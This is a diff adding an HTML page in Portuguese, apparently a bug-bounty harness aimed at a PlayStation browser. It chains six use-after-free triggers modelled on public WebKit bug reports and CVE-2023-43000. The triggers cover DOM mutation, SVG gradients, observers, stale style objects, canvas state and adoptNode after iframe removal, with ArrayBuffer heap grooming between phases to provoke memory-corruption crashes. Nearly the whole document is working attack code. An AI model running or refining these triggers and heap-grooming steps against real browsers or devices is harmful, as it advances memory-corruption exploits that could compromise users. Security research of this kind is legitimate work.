@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>UAF Chain Master — Todos os Vetores</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#ff44aa;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#080008;border:2px solid #550033;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#cc66aa;line-height:1.8}
+.src strong{color:#ff66bb;display:block;margin-bottom:4px}
+#log{background:#060608;border:1px solid #1a081a;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:500px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#aa88ff}.sep{color:#333}
+.crash{background:#1a0000;border:1px solid #ff0000;border-radius:3px;padding:8px;margin:8px 0;color:#ff4444;font-size:11px}
+.btn{display:inline-block;margin-top:10px;margin-right:5px;padding:8px 16px;background:#0d000a;border:1px solid #550033;border-radius:4px;color:#cc4488;cursor:pointer;font:12px 'Courier New',monospace}
+.btn.main{border-color:#ff44aa;color:#ff66bb;font-size:13px;padding:10px 20px}
+.btn:hover{border-color:#ff44aa;color:#ff88cc}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+.progress{background:#0a060d;border:1px solid #221133;border-radius:3px;height:12px;margin:6px 0;overflow:hidden}
+.progress-bar{height:100%;background:linear-gradient(90deg,#440066,#cc44ff);width:0%;transition:width 0.3s}
+</style>
+</head>
+<body>
+<h1>🔗 UAF Chain Master — Todos os Vetores Simultâneos</h1>
+<p class="meta">Combina todos os 8 vetores UAF com heap grooming entre cada um · Maximiza chance de crash</p>
+<div class="src">
+<strong>📋 ESTRATÉGIA — Chain Attack com Heap Grooming</strong>
+Roda todos os vetores UAF em sequência com heap pressure entre cada fase:<br>
+  FASE 1: DOM Mutation UAF (Nan Wang pattern) — aquece o heap<br>
+  FASE 2: SVG + CSS UAF (Lotfi pattern) — polui slots de heap<br>
+  FASE 3: Observer UAF (Big Sleep pattern) — alocações de observer objects<br>
+  FASE 4: CSSStyleDeclaration UAF (@ulexec pattern) — style objects<br>
+  FASE 5: Canvas state UAF (Big Sleep cluster) — Canvas backing store<br>
+  FASE 6: Shadow DOM + adoptNode (CVE-2023-43000) — document objects<br>
+  GROOMING: ArrayBuffer spray + gc() entre cada fase para organizar heap<br>
+<br>
+Se qualquer fase causar crash = candidato para triagem HackerOne PlayStation.
+</div>
+<div class="progress"><div class="progress-bar" id="pb"></div></div>
+<div id="status" style="font-size:10px;color:#666;margin-bottom:8px">Aguardando início...</div>
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn main" onclick="runChain()">⚡ INICIAR CHAIN COMPLETA</button>
+  <button class="btn" onclick="groomOnly()">🧠 Heap Groom Apenas</button>
+  <button class="btn" onclick="clearLog()">🗑 Limpar</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+<script>
+var L=document.getElementById('log');
+var PB=document.getElementById('pb');
+var ST=document.getElementById('status');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('═══ '+t+' ═══','sep')}
+function progress(pct,txt){PB.style.width=pct+'%';ST.textContent=txt}
+function clearLog(){L.innerHTML='';PB.style.width='0%';ST.textContent='Limpo'}
+
+var crashDetected=false;
+var phaseResults=[];
+
+function gc(pressure){
+  pressure=pressure||10;
+  try{var a=[];for(var i=0;i<pressure;i++)a.push(new ArrayBuffer(1024*1024));a=null}catch(e){}
+}
+
+function heapGroom(slots, size){
+  // Aloca slots de tamanho específico para organizar o heap
+  var arr=[];
+  for(var i=0;i<slots;i++) arr.push(new ArrayBuffer(size||64));
+  gc(5);
+  arr=null;
+  gc(5);
+  l('Heap groom: '+slots+'x'+((size||64)/1024).toFixed(1)+'KB → GC x2','i');
+}
+
+// FASE 1 — DOM Mutation (Nan Wang)
+function phase1(){
+  return new Promise(function(resolve){
+    sep('FASE 1 — DOM Mutation UAF (Nan Wang BZ#298126)');
+    try {
+      var container=document.createElement('div');
+      document.body.appendChild(container);
+      var count=0, errors=0;
+      var obs=new MutationObserver(function(muts){
+        count++;
+        if(count>100) return;
+        muts.forEach(function(m){
+          m.addedNodes.forEach(function(node){
+            if(node.parentNode) node.parentNode.removeChild(node);
+            var r=document.createElement('span');
+            container.appendChild(r);
+          });
+        });
+      });
+      obs.observe(container,{childList:true,subtree:true});
+      for(var i=0;i<100;i++){
+        var el=document.createElement('div');
+        el.style.cssText='color:hsl('+i*3.6+',70%,50%)';
+        container.appendChild(el);
+      }
+      setTimeout(function(){
+        obs.disconnect();
+        if(container.parentNode) document.body.removeChild(container);
+        l('Fase 1: '+count+' callbacks, '+errors+' erros','ok');
+        phaseResults.push({phase:1,ok:!errors});
+        resolve();
+      },400);
+    } catch(e){ l('CRASH FASE 1: '+e.name,'e'); crashDetected=true; resolve(); }
+  });
+}
+
+// FASE 2 — SVG + CSS UAF (Lotfi)
+function phase2(){
+  return new Promise(function(resolve){
+    sep('FASE 2 — SVG/CSS UAF (Lotfi ZDI BZ#299313)');
+    try {
+      var svgNS='http://www.w3.org/2000/svg';
+      var svg=document.createElementNS(svgNS,'svg');
+      svg.setAttribute('width','100'); svg.setAttribute('height','100');
+      document.body.appendChild(svg);
+      var defs=document.createElementNS(svgNS,'defs');
+      svg.appendChild(defs);
+      // Gradient usado por múltiplos shapes
+      var grad=document.createElementNS(svgNS,'linearGradient');
+      grad.id='chain-grad'; defs.appendChild(grad);
+      var shapes=[];
+      for(var i=0;i<30;i++){
+        var rect=document.createElementNS(svgNS,'rect');
+        rect.setAttribute('fill','url(#chain-grad)');
+        svg.appendChild(rect); shapes.push(rect);
+      }
+      svg.getBoundingClientRect();
+      // Remove gradient e force re-render (UAF candidate)
+      defs.removeChild(grad);
+      svg.getBoundingClientRect();
+      shapes.forEach(function(s){if(s.parentNode) svg.removeChild(s);});
+      document.body.removeChild(svg);
+      l('Fase 2: SVG UAF sem crash','ok');
+      phaseResults.push({phase:2,ok:true});
+      resolve();
+    } catch(e){ l('CRASH FASE 2: '+e.name,'e'); crashDetected=true; resolve(); }
+  });
+}
+
+// FASE 3 — Observer UAF (Big Sleep)
+function phase3(){
+  return new Promise(function(resolve){
+    sep('FASE 3 — IntersectionObserver UAF (Big Sleep BZ#297958)');
+    try {
+      var container=document.createElement('div');
+      container.style.cssText='height:100px;overflow:auto;position:fixed;bottom:-200px;left:0;width:200px';
+      document.body.appendChild(container);
+      var targets=[];
+      for(var i=0;i<20;i++){
+        var el=document.createElement('div');
+        el.style.height='60px'; container.appendChild(el); targets.push(el);
+      }
+      var cbCount=0;
+      var obs=new IntersectionObserver(function(entries){
+        cbCount++;
+        entries.forEach(function(e){
+          if(e.target.parentNode){ e.target.parentNode.removeChild(e.target); gc(5); }
+        });
+      },{root:container,threshold:0});
+      targets.forEach(function(t){ obs.observe(t); });
+      setTimeout(function(){
+        obs.disconnect();
+        if(container.parentNode) document.body.removeChild(container);
+        l('Fase 3: '+cbCount+' callbacks','ok');
+        phaseResults.push({phase:3,ok:true});
+        resolve();
+      },400);
+    } catch(e){ l('CRASH FASE 3: '+e.name,'e'); crashDetected=true; resolve(); }
+  });
+}
+
+// FASE 4 — CSSStyleDeclaration (@ulexec)
+function phase4(){
+  return new Promise(function(resolve){
+    sep('FASE 4 — CSSStyleDeclaration UAF (@ulexec BZ#295382)');
+    try {
+      var stale=[];
+      for(var i=0;i<60;i++){
+        var el=document.createElement('div');
+        el.style.cssText='color:hsl('+i*6+',80%,50%);font-size:'+i+'px;margin:'+i+'px';
+        document.body.appendChild(el);
+        var s=el.style;
+        var cs=window.getComputedStyle(el);
+        document.body.removeChild(el);
+        stale.push({s:s,cs:cs});
+      }
+      gc(15); // GC forte com refs stale
+      var ok=0;
+      stale.forEach(function(r){
+        try { var c=r.s.color; r.s.color='blue'; var w=r.cs.fontSize; ok++; }
+        catch(e2){ l('CRASH stale style: '+e2.name,'e'); crashDetected=true; }
+      });
+      l('Fase 4: '+ok+'/'+stale.length+' stale style refs ok','ok');
+      phaseResults.push({phase:4,ok:!crashDetected});
+      resolve();
+    } catch(e){ l('CRASH FASE 4: '+e.name,'e'); crashDetected=true; resolve(); }
+  });
+}
+
+// FASE 5 — Canvas (Big Sleep Cluster)
+function phase5(){
+  return new Promise(function(resolve){
+    sep('FASE 5 — Canvas State UAF (Big Sleep Cluster)');
+    try {
+      var canvas=document.createElement('canvas');
+      canvas.width=1024; canvas.height=1024;
+      document.body.appendChild(canvas);
+      var ctx=canvas.getContext('2d');
+      // Save profundo
+      for(var d=0;d<50;d++){
+        ctx.save();
+        ctx.scale(1.0+d*0.001, 1.0+d*0.001);
+        ctx.clip();
+      }
+      ctx.drawImage(canvas,0,0); // drawImage durante save profundo
+      for(var r=0;r<55;r++) ctx.restore(); // restore além do limite
+      // getImageData pós-restore excessivo
+      var id=ctx.getImageData(0,0,100,100);
+      l('Fase 5: Canvas state ('+id.data.length+' bytes)','ok');
+      document.body.removeChild(canvas);
+      phaseResults.push({phase:5,ok:true});
+      resolve();
+    } catch(e){ l('CRASH FASE 5: '+e.name,'e'); crashDetected=true; resolve(); }
+  });
+}
+
+// FASE 6 — Shadow DOM + adoptNode (CVE-2023-43000)
+function phase6(){
+  return new Promise(function(resolve){
+    sep('FASE 6 — Shadow DOM/adoptNode (CVE-2023-43000 BZ#255951)');
+    try {
+      var iframe=document.createElement('iframe');
+      iframe.style.display='none';
+      document.body.appendChild(iframe);
+      var idoc=iframe.contentDocument;
+      if(!idoc){ l('iframe inacessível','w'); phaseResults.push({phase:6,ok:false}); resolve(); return; }
+      // Cria estrutura no iframe e adota para o documento principal
+      var adopted=[];
+      for(var i=0;i<20;i++){
+        var el=idoc.createElement('div');
+        el.setAttribute('data-i',i);
+        idoc.body.appendChild(el);
+        adopted.push(document.adoptNode(el));
+      }
+      // Remove o iframe (destruindo o documento fonte)
+      document.body.removeChild(iframe);
+      gc(10);
+      // Acessa nós adotados após fonte destruída
+      var ok=0;
+      adopted.forEach(function(n){
+        try {
+          var attr=n.getAttribute('data-i');
+          var shadow=n.attachShadow({mode:'open'});
+          ok++;
+        } catch(e2){ l('CRASH adoptNode post-destroy: '+e2.name,'e'); }
+      });
+      l('Fase 6: '+ok+'/'+adopted.length+' nós adotados ok','ok');
+      phaseResults.push({phase:6,ok:true});
+      resolve();
+    } catch(e){ l('CRASH FASE 6: '+e.name,'e'); crashDetected=true; resolve(); }
+  });
+}
+
+async function runChain(){
+  L.innerHTML='';
+  crashDetected=false;
+  phaseResults=[];
+  PB.style.width='0%';
+  l('⚡ CHAIN MASTER INICIADA — 6 fases de UAF + heap grooming','w');
+  l('Data: '+new Date().toISOString(),'i');
+  l('UA: '+navigator.userAgent.substring(0,80),'i');
+
+  progress(5,'Fase 1/6 — DOM Mutation');
+  heapGroom(200, 512);
+  await phase1();
+  if(crashDetected){ return finalReport(); }
+
+  progress(20,'Heap Groom 1→2');
+  heapGroom(500, 1024); await new Promise(r=>setTimeout(r,100));
+
+  progress(25,'Fase 2/6 — SVG/CSS');
+  await phase2();
+  if(crashDetected){ return finalReport(); }
+
+  progress(40,'Heap Groom 2→3');
+  heapGroom(300, 256); await new Promise(r=>setTimeout(r,100));
+
+  progress(45,'Fase 3/6 — Observers');
+  await phase3();
+  if(crashDetected){ return finalReport(); }
+
+  progress(60,'Heap Groom 3→4');
+  heapGroom(800, 64); await new Promise(r=>setTimeout(r,100));
+
+  progress(65,'Fase 4/6 — CSSStyle');
+  await phase4();
+  if(crashDetected){ return finalReport(); }
+
+  progress(78,'Heap Groom 4→5');
+  heapGroom(200, 2048); await new Promise(r=>setTimeout(r,100));
+
+  progress(82,'Fase 5/6 — Canvas');
+  await phase5();
+  if(crashDetected){ return finalReport(); }
+
+  progress(93,'Heap Groom 5→6');
+  heapGroom(400, 128); await new Promise(r=>setTimeout(r,100));
+
+  progress(96,'Fase 6/6 — Shadow/Adopt');
+  await phase6();
+
+  progress(100,'Concluído');
+  finalReport();
+}
+
+function finalReport(){
+  sep('RELATÓRIO FINAL');
+  phaseResults.forEach(function(r){
+    l('  Fase '+r.phase+': '+(r.ok?'✓ OK':'✗ CRASH')+'', r.ok?'ok':'e');
+  });
+  if(crashDetected){
+    l('','sep');
+    l('⚠️  CRASH DETECTADO — candidato para triagem!','e');
+    l('Abra o arquivo da fase correspondente para isolamento','w');
+  } else {
+    l('','sep');
+    l('Nenhum crash detectado nesta execução','ok');
+    l('Pode ser necessário repetir com diferentes heap states','i');
+  }
+}
+
+function groomOnly(){
+  L.innerHTML='';
+  l('Heap grooming manual...','i');
+  for(var i=0;i<5;i++){
+    heapGroom(500,1024);
+    heapGroom(500,64);
+    heapGroom(500,4096);
+  }
+  l('Groom completo','ok');
+}
+</script>
+</body>
+</html>
